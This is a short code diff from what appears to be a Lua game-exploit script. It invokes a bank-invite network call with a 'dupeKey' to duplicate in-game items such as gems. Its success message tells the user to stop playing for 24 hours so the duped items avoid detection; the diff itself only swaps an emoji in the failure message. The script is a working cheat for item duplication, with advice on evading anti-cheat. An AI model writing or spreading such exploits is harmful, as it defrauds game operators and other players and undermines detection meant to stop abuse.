@@ -19,5 +19,5 @@ end
 if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
     lib.Message.New("Dupe successfully! Note Do not Play 24 hours for Duped Gems/Exclusive/Huge will not be detected and will be deleted! Thanks!");
 else
-    lib.Message.New("Dupe failure :frowning: please try again");
+    lib.Message.New("Dupe failure ☹️ please try again");
 end;
